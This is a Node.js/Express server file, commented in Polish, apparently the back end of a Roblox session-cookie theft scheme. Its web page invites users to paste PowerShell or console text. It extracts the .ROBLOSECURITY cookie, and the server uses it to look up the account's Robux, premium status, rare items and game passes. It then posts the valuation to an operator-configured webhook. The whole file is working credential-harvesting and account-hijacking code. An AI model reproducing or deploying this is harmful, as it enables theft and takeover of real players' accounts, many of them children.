const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Strona główna – HTML + JS
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox Cookie Extractor & Checker</title>
  <style>
    body { font-family: Arial, sans-serif; background: #0f0f17; color: #e0e0ff; margin: 0; padding: 20px; }
    .container { max-width: 780px; margin: 0 auto; }
    h1 { color: #6ab0ff; text-align: center; }
    textarea { width: 100%; min-height: 220px; background: #1a1a2e; color: #d0d0ff; border: 1px solid #334; border-radius: 8px; padding: 14px; font-family: Consolas, monospace; font-size: 14px; resize: vertical; margin: 16px 0; }
    button { background: #3b82f6; color: white; border: none; padding: 14px 36px; font-size: 16px; border-radius: 6px; cursor: pointer; display: block; margin: 0 auto 24px; }
    button:hover { background: #2563eb; }
    #result { background: #1a1a2e; border: 1px solid #334; border-radius: 8px; padding: 20px; min-height: 180px; white-space: pre-wrap; word-break: break-all; }
    .error { color: #ff6b6b; font-weight: bold; }
    .success { color: #4ade80; font-weight: bold; }
    .loading { color: #fbbf24; font-style: italic; }
    img#avatar { max-width: 160px; border-radius: 10px; border: 2px solid #334; margin: 12px 0; display: block; }
  </style>
</head>
<body>
<div class="container">
  <h1>Roblox Cookie Checker (PowerShell & inne formaty)</h1>
  <p>Wklej kod PowerShell / konsolę / headers / JSON itp.<br>
  Cookie zostanie automatycznie wyciągnięte z formatu: <code>".ROBLOSECURITY", "TU_COOKIE"</code></p>

  <textarea id="input" placeholder="Wklej tutaj cały kod / tekst..."></textarea>

  <button onclick="check()">Sprawdź i wyślij na webhook</button>

  <div id="result"></div>
</div>

<script>
async function check() {
  const raw = document.getElementById('input').value.trim();
  const result = document.getElementById('result');

  result.innerHTML = '';

  if (!raw) {
    result.innerHTML = '<span class="error">Nic nie wklejono</span>';
    return;
  }

  // ──────────────────────────────────────────────
  // ULEPSZONY WYCIĄGACZ – specjalnie pod Twój PowerShell
  // ──────────────────────────────────────────────
  let cookie = null;

  // 1. Najważniejszy – format z New-Object System.Net.Cookie(".ROBLOSECURITY", "COOKIE", ...)
  let match = raw.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
  if (match && match[1]) {
    cookie = match[1].trim();
  }

  // 2. Jeśli nie złapał – szuka po prostu długiego ciągu z ostrzeżeniem
  if (!cookie) {
    match = raw.match(/_\\|WARNING[^"]{200,}/);
    if (match) cookie = match[0].trim();
  }

  // 3. Ostateczny fallback – najdłuższy ciąg zaczynający się od _
  if (!cookie) {
    const fallbackMatches = raw.match(/_\\|[^"]{200,}/g) || [];
    if (fallbackMatches.length > 0) {
      cookie = fallbackMatches.reduce((a, b) => a.length > b.length ? a : b).trim();
    }
  }

  // Walidacja
  if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
    result.innerHTML = '<span class="error">Nie znaleziono poprawnego .ROBLOSECURITY w tekście</span>';
    return;
  }

  result.innerHTML = '<span class="loading">Znaleziono cookie – sprawdzam i wysyłam na webhook...</span>';

  try {
    const res = await fetch('/check', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie })
    });

    if (!res.ok) throw new Error('Błąd serwera: ' + res.status);

    const json = await res.json();

    if (json.error) {
      result.innerHTML = \`<span class="error">Błąd: \${json.error}</span>\`;
      return;
    }

    let html = \`<span class="success">Konto sprawdzone i wysłane na webhook!</span><br><br>\`;

    if (json.avatarUrl) html += \`<img id="avatar" src="\${json.avatarUrl}" alt="Avatar"><br>\`;

    html += \`
      <b>Username:</b> \${json.username || '?'}<br>
      <b>User ID:</b> \${json.userId || '?'}<br>
      <b>Premium:</b> \${json.hasPremium ? 'True' : 'False'}<br>
      <b>Email Verified:</b> \${json.emailVerified ? 'True' : 'False'}<br>
      <b>Robux:</b> \${json.robux?.toLocaleString('en-US') || 0}<br>
      <b>Headless:</b> \${json.hasHeadless ? 'True' : 'False'}<br>
      <b>Korblox:</b> \${json.hasKorblox ? 'True' : 'False'}<br>
      <b>MM2:</b> \${json.mm2Count || 0}<br>
      <b>AMP:</b> \${json.ampCount || 0}<br>
      <b>SAB:</b> \${json.sabCount || 0}<br>
    \`;

    result.innerHTML = html;

  } catch (err) {
    result.innerHTML = \`<span class="error">Błąd: \${err.message}</span>\`;
  }
}
</script>
</body>
</html>
  `);
});

// Endpoint /check + wysyłka na webhook
app.post('/check', async (req, res) => {
  const { cookie } = req.body || {};
  if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
    return res.status(400).json({ error: 'Missing or invalid cookie' });
  }

  try {
    // CSRF Token
    const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json'
      },
    });
    const csrfToken = tokenRes.headers.get('x-csrf-token');
    if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token');

    // Dane użytkownika
    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'X-CSRF-TOKEN': csrfToken,
        'Accept': 'application/json',
      },
    });
    if (!userRes.ok) throw new Error('Invalid cookie');
    const userData = await userRes.json();

    // Email Verified (hat)
    let emailVerified = false;
    try {
      const ownsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (ownsRes.ok) {
        const ownsData = await ownsRes.json();
        emailVerified = Array.isArray(ownsData.data) && ownsData.data.length > 0;
      }
    } catch {}

    // Premium
    let hasPremium = false;
    try {
      const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (premiumRes.ok) hasPremium = await premiumRes.json();
    } catch {}

    // Robux
    let robux = 0;
    try {
      const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (currencyRes.ok) {
        const data = await currencyRes.json();
        robux = data.robux || 0;
      }
    } catch {}

    // Wiek konta + data utworzenia
    let accountAgeDays = 0;
    let createdDate = null;
    try {
      const profileRes = await fetch(`https://users.roblox.com/v1/users/${userData.id}`);
      if (profileRes.ok) {
        const profile = await profileRes.json();
        if (profile.created) {
          createdDate = profile.created;
          accountAgeDays = Math.floor((Date.now() - new Date(createdDate).getTime()) / 86400000);
        }
      }
    } catch {}

    // Avatar
    let avatarUrl = null;
    try {
      const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
      if (thumbRes.ok) {
        const thumbData = await thumbRes.json();
        avatarUrl = thumbData.data?.[0]?.imageUrl || null;
      }
    } catch {}

    // Gamepasy
    const mm2Ids = [429957, 1308795];
    const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
    const sabIds = [1227013099, 1229510262, 1228591447];
    const allIds = [...mm2Ids, ...ampIds, ...sabIds];
    const hasGamePasses = [];

    try {
      for (const passId of allIds) {
        const gpRes = await fetch(
          `https://inventory.roblox.com/v1/users/${userData.id}/items/GamePass/${passId}`,
          {
            headers: {
              'Cookie': `.ROBLOSECURITY=${cookie}`,
              'X-CSRF-TOKEN': csrfToken,
              'Accept': 'application/json',
            },
          }
        );
        if (gpRes.ok) {
          const gpData = await gpRes.json();
          if (Array.isArray(gpData.data) && gpData.data.length > 0) {
            hasGamePasses.push(passId);
          }
        }
      }
    } catch {}

    const mm2Count = hasGamePasses.filter(id => mm2Ids.includes(id)).length;
    const ampCount = hasGamePasses.filter(id => ampIds.includes(id)).length;
    const sabCount = hasGamePasses.filter(id => sabIds.includes(id)).length;

    // Headless i Korblox
    let hasHeadless = false;
    let hasKorblox = false;
    try {
      const headlessRes = await fetch(
        `https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/201`,
        { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken } }
      );
      if (headlessRes.ok) {
        const data = await headlessRes.json();
        hasHeadless = Array.isArray(data.data) && data.data.length > 0;
      }

      const korbloxRes = await fetch(
        `https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/192`,
        { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken } }
      );
      if (korbloxRes.ok) {
        const data = await korbloxRes.json();
        hasKorblox = Array.isArray(data.data) && data.data.length > 0;
      }
    } catch {}

    const result = {
      success: true,
      username: userData.name,
      userId: userData.id,
      hasPremium,
      robux,
      accountAgeDays,
      created: createdDate || 'failed',
      avatarUrl,
      emailVerified,
      hasHeadless,
      hasKorblox,
      mm2Count,
      ampCount,
      sabCount
    };

    // Wysyłka na webhook (jeśli masz zmienną WEBHOOK w Railway)
    const webhookUrl = process.env.WEBHOOK;
    if (webhookUrl) {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [{
              color: 0x0F0F23,
              title: `<:User:1481761037257674872> ${userData.name}`,
              description: "**AVATAR**",
              thumbnail: {
                url: avatarUrl || "https://tr.rbxcdn.com/30DAY-AvatarHeadshot?width=720&height=720&format=png"
              },
              fields: [
                {
                  name: "**Info**",
                  value:
                    `<:Robux:1481762078124544030> Robux: **${robux.toLocaleString('en-US')}**\n` +
                    `<:Premium:1481761448592933034> Premium: **${hasPremium ? 'True' : 'False'}**\n` +
                    `<:Email:1481762590467035136> Email: **${emailVerified ? 'True' : 'False'}**`,
                  inline: true
                },
                {
                  name: "**Games**",
                  value:
                    `<:MM2:1481763122808230164> MM2: **${mm2Count}**\n` +
                    `<:AMP:1481763635775930520> AMP: **${ampCount}**\n` +
                    `<:SAB:1481763931113394177> SAB: **${sabCount}**`,
                  inline: true
                },
                {
                  name: "**Inventory**",
                  value:
                    `<:Korblox:1481770192500424775> Korblox: **${hasKorblox ? 'True' : 'False'}**\n` +
                    `<:Headless:1481770398642077919> Headless: **${hasHeadless ? 'True' : 'False'}**`,
                  inline: true
                }
              ],
              footer: {
                text: "24H! • " + new Date().toLocaleString('pl-PL')
              },
              timestamp: new Date().toISOString()
            }]
          })
        });
      } catch (e) {
        console.error("Błąd wysyłki webhook:", e.message);
      }
    }

    res.json(result);

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message || 'Internal server error' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Serwer działa na porcie ${PORT}`);
});
